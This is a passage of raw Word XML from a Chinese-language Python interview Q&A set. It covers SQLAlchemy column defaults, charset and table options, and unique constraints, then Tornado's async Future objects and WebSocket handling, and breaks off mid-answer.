        <w:t xml:space="preserve">    __tablename__ = 'userinfo'   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D33F5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id = Column(Integer, primary_key=True, autoincrement=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643154A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name = Column(String(64), unique=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5388798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ctime = Column(DateTime, default=datetime.now())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AB367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p>
    <w:p w14:paraId="045547D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不正确：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B146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Ctime</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段中参数应为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>’default=datetime.now’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D333B38" w14:textId="146E5478"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now </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>后面不应该加括号，加了的话，字段不会实时更新。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2173A432" w14:textId="671A7F61"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080</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SQLAchemy</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中如何为表设置引擎和字符编码？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6EC5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sqlalchemy</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置编码字符集，一定要在数据库访问的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上增加</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'charset=utf8'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709296E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否则数据库的连接就不是</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'utf8'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的编码格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B3BD4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1A18C966" w14:textId="6B99B6A1"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eng=create_engine('mysql://root:root@localhost:3306/test2?charset=utf8',echo=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F2FC2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1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置引擎编码方式为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>utf8</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBF996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606C608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engine = create_engine("mysql+pymysql://root:123456@127.0.0.1:3306/sqldb01?charset=utf8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BFF4A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2. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置数据库表编码方式为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>utf8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3719B42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70216EA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class UserType(Base):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9EA36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__tablename__ = 'usertype'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EFA32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id = Column(Integer, primary_key=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5953B96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caption = Column(String(50), default='</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>管理员</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFBBBB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添加配置设置编码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035E4B6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__table_args__ = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537E9CA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'mysql_charset':'utf8'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4DB4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p>
    <w:p w14:paraId="2F08CA7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3D71F0F3" w14:textId="55ED9B03"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这样生成的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句就自动设置数据表编码为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>utf8</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>了</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,__table_args__</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>还可设置存储引擎、外键约束等等信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57356C79" w14:textId="50D6150D"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081</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SQLAchemy</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中如何设置联合唯一索引？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378F41C3"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通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'UniqueConstraint'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段来设置联合唯一索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDAAD9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__table_args=(UniqueConstraint('h_id','username',name='_h_username_uc'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135A5D8E" w14:textId="0E5DABD8"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#h_id</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组成联合唯一约束</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC3D453" w14:textId="5B057C93"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>82</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简述</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架的特点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E90FB5" w14:textId="067EC624"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异步非阻塞</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2425CE63" w14:textId="53B62555"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>83</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简述</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架中</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Future</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>对象的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596B7937"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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实现异步非阻塞</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B16173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视图函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>futrue</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>futrue</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象默认：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698633FB"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self._done = False   </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，请求未完成</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C85268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self._result = None  </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，请求完成后返回值，用于传递给回调函数使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2517E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5912346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tornado</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就会一直去检测</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>futrue</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>_done</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是否已经变成</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A725F9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00C8FDF8"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如果</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IO</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求执行完毕，自动会调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>future</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>set_result</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C3C0B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self._result = result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C56ACD"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self._done = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101D8EA5" w14:textId="0E642CFD"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参考：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http://www.cnblogs.com/wupeiqi/p/6536518.html</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（自定义异步非阻塞</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52294A0D" w14:textId="55F16FFB" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00BC0D9A"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084</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Tornado</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架中如何编写</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>程序？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150AB4DC"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Tornado</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>websocket</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模块中提供了一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WebSocketHandler</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
